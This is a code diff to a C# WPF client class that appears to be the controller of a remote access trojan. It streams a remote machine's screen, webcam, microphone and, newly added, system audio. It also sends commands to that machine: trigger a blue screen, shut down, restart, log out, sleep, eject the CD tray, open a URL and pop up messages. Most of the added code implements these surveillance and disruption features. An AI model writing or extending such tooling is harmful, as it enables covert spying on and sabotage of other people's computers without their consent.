@@ -1,29 +1,16 @@
 ﻿using System;
-using System.Drawing;
 using System.IO;
 using System.Net.Sockets;
-using System.Runtime.InteropServices.ComTypes;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Controls;
-using System;
-using System.Diagnostics;
-using System.Drawing;
-using System.IO;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices.ComTypes;
-using System.Security.Permissions;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using NAudio.Wave;
 using MessageBox = System.Windows.MessageBox;
 using Image = System.Drawing.Image;
 using Client2;
+using System.Windows;
+using Client2.Views.Pages;
 
 public class Connection
 {
@@ -32,6 +19,9 @@ public class Connection
     public static string Password { get; set; }
 
     public Page Page { get; }
+
+    static MainWindow mainWindow = (MainWindow)Application.Current.MainWindow;
+
 
     public MainWindow Window { get; }
 
@@ -52,12 +42,14 @@ public class Connection
     static string info;
 
     private bool MicImageSwitch = false;
+    private bool SpeakerImageSwitch = false;
     private bool PauseImageSwitch = false;
     private bool PauseCamSwitch = false;
     static int CurremtCameraIndex = 1;
 
     private static int fps = 60;
     private static int compression = 100;
+
 
     static NetworkStream stream;
 
@@ -81,6 +73,7 @@ public class Connection
             stream = client.GetStream();
             cameraStream = cameraClient.GetStream();
 
+           
             SendData("info");
 
             byte[] buffer = new byte[1024];
@@ -102,7 +95,8 @@ public class Connection
         }
         catch (Exception ex)
         {
-            MessageBox.Show("Error connecting to server: " + ex.Message);
+            await mainWindow.DialogError("Error connecting to server: ", ex.Message, CancellationToken.None);
+            mainWindow.RootNavigation.Navigate(typeof(MainPage));
         }
     }
 
@@ -142,22 +136,63 @@ public class Connection
             else
             {
                 waveOut?.Stop();
+                client2?.Close();
                 client2?.Dispose();
             }
         }
-        catch //(Exception ex)
+        catch { }
+
+    }
+
+    public static async Task PlaySytemAudio(bool toggle)
+    {
+        try
         {
-            //MessageBox.Show($"Error playing audio: {ex.Message}");
+            if (toggle)
+            {
+                client2 = new TcpClient(Ip, 8891);
+                Console.WriteLine("Connected to speaker server.");
+
+                waveOut = new WaveOutEvent();
+
+                bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 1)); // 44.1 kHz, mono
+                waveOut.Init(bufferedWaveProvider);
+
+                waveOut.Play();
+                Console.WriteLine("Playing audio...");
+
+                using (BinaryReader reader = new BinaryReader(client2.GetStream()))
+                {
+                    while (client2.Connected)
+                    {
+                        // Read the length of the audio data
+                        int length = reader.ReadInt32();
+
+                        // Read the audio data
+                        byte[] audioData = reader.ReadBytes(length);
+
+                        // Write the audio data to the BufferedWaveProvider
+                        bufferedWaveProvider.AddSamples(audioData, 0, length);
+                    }
+                }
+            }
+            else
+            {
+                waveOut?.Stop();
+                client2?.Close();
+                client2?.Dispose();
+            }
         }
+        catch { }
     }
 
     public void SendData(string stringData)
     {
         byte[] data = Encoding.UTF8.GetBytes(stringData);
-        Task.Run(() => SendDataToServer(data));
+        Task.Run(() => SendDataByte(data));
     }
 
-    public async void SendDataToServer(byte[] data)
+    public async void SendDataByte(byte[] data)
     {
         try
         {
@@ -185,37 +220,54 @@ public class Connection
 
     private async Task ReceiveScreen(CancellationToken cancellationToken)
     {
-
         SendData("resumeScreen");
 
         while (!cancellationToken.IsCancellationRequested)
         {
             try
             {
-                // Receive screenshot size
-                byte[] sizeBytes = new byte[4];
-                await stream.ReadAsync(sizeBytes, 0, sizeBytes.Length, cancellationToken);
-                int imageSize = BitConverter.ToInt32(sizeBytes, 0);
 
-                // Receive screenshot data
-                byte[] imageData = new byte[imageSize];
-                int totalBytesRead = 0;
-                while (totalBytesRead < imageSize)
+                // Check if the stream is still readable
+                if (!stream.CanRead)
                 {
-                    int bytesRead = await stream.ReadAsync(imageData, totalBytesRead, imageSize - totalBytesRead, cancellationToken);
-                    if (bytesRead == 0)
-                    {
-                        throw new IOException("End of stream reached while reading image data.");
-                    }
-                    totalBytesRead += bytesRead;
+                    Console.WriteLine("Stream is no longer readable.");
+                    break;
                 }
 
-                // Create image from received data
-                using (MemoryStream ms = new MemoryStream(imageData))
+
+                // Read the number of frames in the batch
+                byte[] frameCountBytes = new byte[sizeof(int)];
+                await stream.ReadAsync(frameCountBytes, 0, frameCountBytes.Length, cancellationToken);
+                int frameCount = BitConverter.ToInt32(frameCountBytes, 0);
+
+                // Process each frame in the batch
+                for (int i = 0; i < frameCount; i++)
                 {
-                    ms.Position = 0; // Set stream position to beginning
-                    Image screenshot = Image.FromStream(ms);
-                    ScreenUpdated.Invoke(screenshot); // Update the screen image (invoke on UI thread
+                    // Read the frame size
+                    byte[] sizeBytes = new byte[sizeof(int)];
+                    await stream.ReadAsync(sizeBytes, 0, sizeBytes.Length, cancellationToken);
+                    int imageSize = BitConverter.ToInt32(sizeBytes, 0);
+
+                    // Read the frame data
+                    byte[] imageData = new byte[imageSize];
+                    int totalBytesRead = 0;
+                    while (totalBytesRead < imageSize)
+                    {
+                        int bytesRead = await stream.ReadAsync(imageData, totalBytesRead, imageSize - totalBytesRead, cancellationToken);
+                        if (bytesRead == 0)
+                        {
+                            throw new IOException("End of stream reached while reading image data.");
+                        }
+                        totalBytesRead += bytesRead;
+                    }
+
+                    // Create image from received data
+                    using (MemoryStream ms = new MemoryStream(imageData))
+                    {
+                        ms.Position = 0; // Set stream position to beginning
+                        Image screenshot = Image.FromStream(ms);
+                        ScreenUpdated.Invoke(screenshot); // Update the screen image (invoke on UI thread)
+                    }
                 }
 
                 await Task.Delay(1000 / fps, cancellationToken); // Adjust the interval as needed
@@ -236,7 +288,6 @@ public class Connection
         stream.Close();
         client.Close();
     }
-
 
     private async Task ReceiveCameraStream(CancellationToken cancellationToken)
     {
@@ -325,7 +376,7 @@ public class Connection
         SendData("cam" + CurremtCameraIndex.ToString());
     }
 
-    public void PauseCamera()
+    public void PauseCameraSwitch()
     {
         if (PauseCamSwitch)
         {
@@ -339,7 +390,7 @@ public class Connection
         }
     }
 
-    public void Pause()
+    public void PauseScreenSwitch()
     {
         if (PauseImageSwitch)
         {
@@ -368,10 +419,29 @@ public class Connection
         }
     }
 
+    public void Speaker(bool Switch)
+    {
+        if (Switch)
+        {
+
+            Task.Run(() => PlaySytemAudio(true));
+            SpeakerImageSwitch = true;
+        }
+        else
+        {
+            Task.Run(() => PlaySytemAudio(false));
+            SpeakerImageSwitch = false;
+        }
+    }
+
     public void Reconnect()
     {
         MicImageSwitch = false;
         Task.Run(() => PlayAudio(false));
+
+        Task.Run(() => PlaySytemAudio(false));
+        SpeakerImageSwitch = false;
+
         ConnectToServer();
     }
 
@@ -380,6 +450,65 @@ public class Connection
         cancellationTokenSource.Cancel();
         MicImageSwitch = false;
         Task.Run(() => PlayAudio(false));
+
+        Task.Run(() => PlaySytemAudio(false));
+        SpeakerImageSwitch = false;
+    }
+
+    public async void OpenWeb()
+    {
+        string url = await mainWindow.DialogCreateUrl(CancellationToken.None);
+
+        SendData("openweb" + url);
+
+    }
+
+    public void OpenCdTray()
+    {
+        SendData("togglecd");
+    }
+
+    public async void SendBSOD()
+    {
+        if(await mainWindow.DialogBSOD(CancellationToken.None))
+        {
+            SendData("bsod");
+
+        }
+    }
+
+    public async void SendMsg() 
+    {
+        string msg = await mainWindow.DialogCreateMsgBox(CancellationToken.None);
+
+        SendData("msg" + msg);
+
+    }
+
+    public async void Shutdown()
+    {
+        if(await mainWindow.DialogShutdown(CancellationToken.None))
+        {
+            SendData("shutdown");
+        }
+    }
+
+    public async void Restart()
+    {
+        if(await mainWindow.DialogRestart(CancellationToken.None))
+        {
+            SendData("restart");
+        }
+    }
+
+    public void Sleep()
+    {
+        SendData("sleep");
+    }
+
+    public void LogOut()
+    {
+        SendData("logout");
     }
 
 }
